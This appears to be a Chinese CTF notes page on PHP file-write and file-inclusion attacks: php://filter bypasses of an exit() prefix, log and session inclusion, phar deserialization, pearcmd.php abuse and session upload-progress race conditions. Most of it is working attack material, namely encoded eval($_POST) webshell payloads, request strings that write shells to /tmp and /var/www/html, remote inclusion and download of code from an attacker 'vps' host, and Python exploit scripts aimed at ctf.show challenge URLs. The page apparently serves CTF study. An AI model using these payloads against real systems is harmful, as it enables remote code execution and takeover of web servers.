<h2 id="死亡die-绕过"><a href="#死亡die-绕过" class="headerlink" title="死亡die 绕过"></a>死亡die 绕过</h2><p>polar 写shell</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>],<span class="string">&quot;&lt;?php exit();&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h3><p>最常用的就是base64编码了，通过解码把<code>&lt;?php exit();</code>解码为乱码，而后面我们传入的webshell的base64内容被正常解码，就可以直接干掉<code>&lt;?php exit();</code>得到一个shell了,不过由于<code>&lt;?php exit();</code>中只有phpexit参与了解码，由于base64解码时4转3,所以需要补一位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET</span><br><span class="line">?filename=php://filter/write=convert.base64-decode/resource=z.php</span><br><span class="line">POST</span><br><span class="line">content=aPD89ZXZhbCgkX1BPU1RbMV0pPz4=</span><br><span class="line">//&lt;?=eval($_POST[1])?&gt;编码后添加一个单字符a</span><br></pre></td></tr></table></figure>

<h3 id="rot13"><a href="#rot13" class="headerlink" title="rot13"></a>rot13</h3><p>rot 13 绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php phpinfo();?&gt; =&gt; &lt;?cuc cucvasb();?&gt; -&gt; $content</span><br><span class="line">php://filter/write=string.rot13/resource=zhou.php  -&gt; $filename</span><br><span class="line">同样写shell</span><br><span class="line">&lt;?php eval($_POST[&#x27;1&#x27;]);?&gt; =&gt; &lt;?cuc riny($_CBFG[&#x27;1&#x27;]);?&gt; -&gt; $content</span><br></pre></td></tr></table></figure>

<h3 id="strip-tags方法-amp-amp-base64"><a href="#strip-tags方法-amp-amp-base64" class="headerlink" title="strip_tags方法&amp;&amp;base64"></a>strip_tags方法&amp;&amp;base64</h3><p>strip_tags剥去字符串中的 HTML、XML 以及 PHP 的标签</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://filter/write=string.strip_tags|convert.base64-decode/resource=m.php</span><br><span class="line">content=?&gt;PD9waHAgcGhwaW5mbygpOw==</span><br></pre></td></tr></table></figure>

<h3 id="iconv字符编码转换"><a href="#iconv字符编码转换" class="headerlink" title="iconv字符编码转换"></a>iconv字符编码转换</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/convert.iconv.UCS-2BE.UCS-2LE/resource=m.php</span><br><span class="line">or</span><br><span class="line">php://filter/convert.iconv.UCS-4BE.UCS-4LE/resource=m.php</span><br></pre></td></tr></table></figure>

<p>通过UCS-2或者UCS-4的方式，对目标字符串进行2&#x2F;4位一反转，也就是说构造的content字节数需要是UCS-2或UCS-4中2或者4的倍数，不然不能进行反转，那我们就可以利用这种过滤器进行编码转换绕过了。我们利用如下方法构造我们需要的payload。(注意倍数问题，否则输出错误</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo iconv(&#x27;UCS-2LE&#x27;,&#x27;UCS-2BE&#x27;,&#x27;&lt;?php phpinfo();?&gt;&#x27;);</span><br><span class="line">#   ?&lt;hp phpipfn(o;)&gt;?</span><br></pre></td></tr></table></figure>

<p><a href="https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/">https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/</a></p>
<h2 id="日志文件包含"><a href="#日志文件包含" class="headerlink" title="日志文件包含"></a>日志文件包含</h2><p>包含日志文件</p>
<h3 id="日志和配置文件默认存放路径"><a href="#日志和配置文件默认存放路径" class="headerlink" title="日志和配置文件默认存放路径"></a>日志和配置文件默认存放路径</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apache+Linux日志默认路径 </span><br><span class="line">/etc/httpd/logs/access_log</span><br><span class="line">/var/log/httpd/access_log</span><br><span class="line">apache+win2003日志默认路径 </span><br><span class="line">D:\xampp\apache\logs\access.log</span><br><span class="line">D:\xampp\apache\logs\error.log</span><br><span class="line">IIS6.0+win2003默认日志文件 </span><br><span class="line">C:\WINDOWS\system32\Logfiles</span><br><span class="line">IIS7.0+win2003 默认日志文件  %SystemDrive%\inetpub\logs\LogFiles</span><br><span class="line">nginx 日志文件 </span><br><span class="line">用户安装目录logs目录下（/usr/local/nginx/logs） </span><br><span class="line">/var/log/nginx/access.log</span><br><span class="line">/var/log/nginx/error.log</span><br><span class="line">apache+linux 默认配置文件 </span><br><span class="line">/etc/httpd/conf/httpd.conf</span><br><span class="line">index.php?page=/etc/init.d/httpd</span><br><span class="line">IIS6.0+win2003 配置文件 C:/Windows/system32/inetsrv/metabase.xml</span><br><span class="line">IIS7.0+WIN 配置文件 C:\Windows\System32\inetsrv\config\applicationHost.config</span><br></pre></td></tr></table></figure>

<h3 id="session常见存储路径"><a href="#session常见存储路径" class="headerlink" title="session常见存储路径"></a>session常见存储路径</h3><blockquote>
<p>php的session文件的保存路径可以在phpinfo的<strong>session.save_path</strong>看到，<br>session文件格式： sess_[phpsessid] ，phpsessid在发送的请求的 cookie 字段中可以看到</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/lib/php/sess_PHPSESSID</span><br><span class="line">/var/lib/php/sess_PHPSESSID</span><br><span class="line">/tmp/sess_PHPSESSID</span><br><span class="line">/tmp/sessions/sess_PHPSESSID</span><br></pre></td></tr></table></figure>

<h3 id="包含系统文件"><a href="#包含系统文件" class="headerlink" title="包含系统文件"></a>包含系统文件</h3><p>包含 &#x2F;pros&#x2F;self&#x2F;environ</p>
<p>条件</p>
<ul>
<li>php以cgi方式运行，这样environ才会保持UA头。</li>
<li>environ文件存储位置已知，且environ文件可读。</li>
</ul>
<blockquote>
<p>proc&#x2F;self&#x2F;environ中会保存user-agent头，如果在user-agent中插入php代码，则php代码会被写入到environ中，之后再包含它，即可。</p>
</blockquote>
<h2 id="截断包含"><a href="#截断包含" class="headerlink" title="截断包含"></a>截断包含</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="variable">$_GET</span>[a].<span class="string">&#x27;php&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><p>需要php&lt;5.3</p>
<p>zhou.txt</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=zhou.txt%00</span><br></pre></td></tr></table></figure>

<p>.txt后缀将不进入解析 从而包含zhou.php</p>
<h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p>?来伪截断这种阶段方法不受GPC和PHP版本的影响</p>
<p>从而实现任意文件包含 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=http://vps/zhou.txt?</span><br><span class="line">a=http://vps/zhou.txt#</span><br></pre></td></tr></table></figure>

<h1 id="phar文件"><a href="#phar文件" class="headerlink" title="phar文件"></a>phar文件</h1><p>phar:&#x2F;&#x2F;支持zip、phar格式的压缩（归档）文件，无视后缀（也就是说jpg后缀照样给你解开来），?file&#x3D;phar:&#x2F;&#x2F;压缩包路径&#x2F;压缩包内文件名，绝对路径和相对路径都行。</p>
<p>利用方法：index.php?file&#x3D;phar:&#x2F;&#x2F;test.zip&#x2F;test.txtindex.php?file&#x3D;phar:&#x2F;&#x2F;test.xxx&#x2F;test.txt</p>
<p>制作phar文件（php5.3之后）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;phar.readonly = On   //修改前</span><br><span class="line">phar.readonly = Off ///修改后</span><br></pre></td></tr></table></figure>

<p>生成一个phar </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;test.phar&#x27;</span>);   <span class="comment">//删除之前的test.par文件(如果有)</span></span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;test.phar&#x27;</span>);  <span class="comment">//创建一个phar对象，文件名必须以phar为后缀</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();  <span class="comment">//开始写文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);  <span class="comment">//写入stub</span></span><br><span class="line"><span class="variable">$o</span>=<span class="keyword">new</span> <span class="title class_">TestObject</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);<span class="comment">//写入meta-data</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);  <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="利用压缩文档"><a href="#利用压缩文档" class="headerlink" title="利用压缩文档"></a>利用压缩文档</h2><p>ctfshow 803 题</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;1.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;a.txt&quot;</span>, <span class="string">&quot;&lt;?php eval(\$_POST[1]);?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://3d63c6b9-8cee-409b-b3b7-27b5e4b156c5.challenge.ctf.show/index.php&quot;</span></span><br><span class="line">data1=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;/tmp/a.phar&#x27;</span>,<span class="string">&#x27;content&#x27;</span>:<span class="built_in">open</span>(<span class="string">&#x27;1.phar&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()&#125;</span><br><span class="line">data2=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;phar:///tmp/a.phar/a&#x27;</span>,<span class="string">&#x27;content&#x27;</span>:<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>:<span class="string">&#x27;system(&quot;cat f*&quot;);&#x27;</span>&#125;  </span><br><span class="line">requests.post(url,data=data1)</span><br><span class="line">r=requests.post(url,data=data2)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>



<h2 id="利用反序列化"><a href="#利用反序列化" class="headerlink" title="利用反序列化"></a>利用反序列化</h2><p>phar协议解析文件时，会自动触发对manifest字段的序列化字符串进行反序列化。</p>
<p>例题 804</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hacker</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$content</span>) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/php|data|ftp/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>,<span class="variable">$content</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hacker</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">hacker</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;code=<span class="string">&quot;system(&#x27;cat f*&#x27;);&quot;</span>;</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;shell.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);  <span class="comment">//Metadata 可以被反序列化</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;a.txt&quot;</span>, <span class="string">&quot;&lt;?php eval(\$_POST[1]);?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="tricks-1"><a href="#tricks-1" class="headerlink" title="tricks"></a>tricks</h2><p>在前缀非phar:&#x2F;&#x2F;的情况下调用了phar:&#x2F;&#x2F;</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$z</span> = <span class="string">&#x27;compress.bzip2://phar:///home/sx/test.phar/test.txt&#x27;</span>;</span><br><span class="line"><span class="variable">$z</span> = <span class="string">&#x27;compress.zlib://phar:///home/sx/test.phar/test.txt&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$z</span>);</span><br></pre></td></tr></table></figure>

<p>php:&#x2F;&#x2F;</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=phar://phar.phar&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=phar://phar.phar&#x27;</span>);</span><br></pre></td></tr></table></figure>

<hr>
<p>简单的绕过</p>
<p>我们可以利用stub部分前缀任意的特性：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);   <span class="comment">//设置 stub，增加 gif 文件头</span></span><br></pre></td></tr></table></figure>



<h1 id="percmd文件包含"><a href="#percmd文件包含" class="headerlink" title="percmd文件包含"></a>percmd文件包含</h1><p><a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">Docker PHP裸文件本地包含综述 | 离别歌 (leavesongs.com)</a></p>
<p> php&lt;&#x3D;7.3默认安装pecl&#x2F;pear</p>
<p>pearcmd.php的路径 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/local/lib/php/pearcmd.php</span><br></pre></td></tr></table></figure>

<h2 id="当get-文件包含时"><a href="#当get-文件包含时" class="headerlink" title="当get 文件包含时"></a>当get 文件包含时</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=@eval($_POST[&#x27;cmd&#x27;]);?&gt;+/var/www/html/cmd.php</span><br></pre></td></tr></table></figure>

<p>例子：铁三初赛</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">  <span class="keyword">include</span>(<span class="string">&quot;./uploads&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&quot;f&quot;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?+config-create+/&amp;f=../../../../usr/local/lib/php/pearcmd.php&amp;/&lt;?=@eval($_POST[&#x27;cmd&#x27;]);?&gt;+/tmp/cmd.php</span><br></pre></td></tr></table></figure>

<p>然后蚁剑链接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?f=../../../../tmp/cmd.php</span><br></pre></td></tr></table></figure>



<h2 id="当post-文件包含时"><a href="#当post-文件包含时" class="headerlink" title="当post 文件包含时"></a>当post 文件包含时</h2><p>例题ctfshow元旦杯</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$path</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$path</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^[a-z]+/&quot;</span>,<span class="variable">$path</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;file://&quot;</span>.<span class="variable">$_POST</span>[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET传</span><br><span class="line">?+config-create+/&lt;?=@eval($_POST[%27cmd%27]);die()?&gt;+/tmp/test.php</span><br><span class="line">POST传</span><br><span class="line">1=localhost/usr/local/lib/php/pearcmd.php</span><br></pre></td></tr></table></figure>

<p>远程文件包含</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET传</span><br><span class="line">?+download+http://vps/1.php</span><br><span class="line">POST包含pearcmd.php</span><br><span class="line">1=localhost/usr/local/lib/php/pearcmd.php</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location:/index.php?file=&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\.\.|data|input|glob|global|var|dict|gopher|file|http|phar|localhost|\?|\*|\~|zip|7z|compress/is&#x27;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">        <span class="keyword">include_once</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="session-条件竞争"><a href="#session-条件竞争" class="headerlink" title="session 条件竞争"></a>session 条件竞争</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>漏洞原理在php.ini有以下几个默认选项</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. session.upload_progress.enabled = on</span><br><span class="line">2. session.upload_progress.cleanup = on</span><br><span class="line">3. session.upload_progress.prefix = &quot;upload_progress_&quot;</span><br><span class="line">4. session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line">5. session.upload_progress.freq = &quot;1%&quot;</span><br><span class="line">6. session.upload_progress.min_freq = &quot;1&quot;</span><br></pre></td></tr></table></figure>

<p>只需要了解前四个配置选项即可</p>
<blockquote>
<p><code>enabled=on</code>表示<code>upload_progress</code>功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；</p>
<p><code>cleanup=on</code>表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要；</p>
<p><code>name</code>当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；</p>
<p><code>prefix+name</code>将表示为session中的键名</p>
</blockquote>
<p>简单的说 post 传入PHP_SESSION_UPLOAD_PROGRESS 的内容 为木马 同时上传文件</p>
<p>设置cookie :PHPSESSID &#x3D;zhou 会生成在服务器localhost&#x2F;tmp&#x2F;sess_zhou 的木马</p>
<p>做题食用</p>
<p>例题ctfshow元旦杯</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$path</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$path</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^[a-z]+/&quot;</span>,<span class="variable">$path</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;file://&quot;</span>.<span class="variable">$_POST</span>[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">import sys</span><br><span class="line">session=requests.<span class="title function_ invoke__">session</span>()</span><br><span class="line">sess=<span class="string">&#x27;zhou&#x27;</span></span><br><span class="line">url1=<span class="string">&quot;http://3cd0cd40-30ab-4897-95e8-3130fe804823.challenge.ctf.show/&quot;</span></span><br><span class="line">data1=&#123;</span><br><span class="line">	<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php eval($_POST[2]);?&gt;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">data2=&#123;</span><br><span class="line">     <span class="string">&quot;1&quot;</span>:<span class="string">&quot;localhost/tmp/sess_&quot;</span>+sess,   <span class="comment">// 会在生成一个文件</span></span><br><span class="line">	<span class="string">&#x27;2&#x27;</span>:<span class="string">&#x27;system(&quot;cat /f*&quot;);&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">file=&#123;</span><br><span class="line">	<span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;abc&#x27;</span> <span class="comment">//文件内容任意</span></span><br><span class="line">&#125;</span><br><span class="line">cookies=&#123;</span><br><span class="line">	<span class="string">&#x27;PHPSESSID&#x27;</span>: sess</span><br><span class="line">&#125;</span><br><span class="line">def <span class="title function_ invoke__">write</span>():</span><br><span class="line">	<span class="keyword">while</span> True:</span><br><span class="line">		r = session.<span class="title function_ invoke__">post</span>(url1,data=data1,files=file,cookies=cookies)</span><br><span class="line">def <span class="title function_ invoke__">read</span>():</span><br><span class="line">	<span class="keyword">while</span> True:</span><br><span class="line">		r = session.<span class="title function_ invoke__">post</span>(url1,data=data2)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">&#x27;ctfshow&#123;&#x27;</span> in r.text:</span><br><span class="line">			<span class="keyword">print</span>(r.text)</span><br><span class="line">threads = [threading.<span class="title function_ invoke__">Thread</span>(target=write),</span><br><span class="line">       threading.<span class="title function_ invoke__">Thread</span>(target=read)]</span><br><span class="line"><span class="keyword">for</span> t in threads:</span><br><span class="line">	t.<span class="title function_ invoke__">start</span>()</span><br></pre></td></tr></table></figure>

<h1 id="临时文件"><a href="#临时文件" class="headerlink" title="临时文件"></a>临时文件</h1><h2 id="前置知识-1"><a href="#前置知识-1" class="headerlink" title="前置知识"></a>前置知识</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_FILES[&#x27;userfile&#x27;][&#x27;name&#x27;] 客户端文件的原名称。</span><br><span class="line">$_FILES[&#x27;userfile&#x27;][&#x27;type&#x27;] 文件的 MIME 类型，如果浏览器提供该信息的支持，例如&quot;image/gif&quot;。</span><br><span class="line">$_FILES[&#x27;userfile&#x27;][&#x27;size&#x27;] 已上传文件的大小，单位为字节。</span><br><span class="line">$_FILES[&#x27;userfile&#x27;][&#x27;tmp_name&#x27;] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定，默认是/tmp目录。</span><br><span class="line">$_FILES[&#x27;userfile&#x27;][&#x27;error&#x27;] 该文件上传的错误代码，上传成功其值为0，否则为错误信息。</span><br><span class="line">$_FILES[&#x27;userfile&#x27;][&#x27;tmp_name&#x27;] 文件被上传后在服务端存储的临时文件名</span><br></pre></td></tr></table></figure>

<p>在临时文件包含漏洞中<code>$_FILES[&#39;userfile&#39;][&#39;tmp_name&#39;]</code>这个变量值的获取很重要，因为临时文件的名字都是由随机函数生成的，只有知道文件的名字才能正确的去包含它。</p>
<p>文件被上传后，默认会被存储到服务端的默认临时目录中，该临时目录由<code>php.ini</code>的<code>upload_tmp_dir</code>属性指定，假如<code>upload_tmp_dir</code>的路径不可写，PHP会上传到系统默认的临时目录中。</p>
<p>通常在&#x2F;tmp&#x2F; 下</p>
<p>Windows系统服务的临时文件主要存储在系统盘Windows文件夹下，具有一定的开放权限。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="attr">C</span>:<span class="regexp">/Windows/</span></span><br><span class="line"><span class="attr">C</span>:<span class="regexp">/Windows/</span><span class="title class_">Temp</span>/</span><br></pre></td></tr></table></figure>

<p>这个时候就需要用到条件竞争，具体原理和过程如下：</p>
<p>验证了phpinfo的特性确实存在，所以在文件包含漏洞找不到可利用的文件时，我们就可以利用这一特性，找到并提取临时文件名，然后包含之即可Getshell。</p>
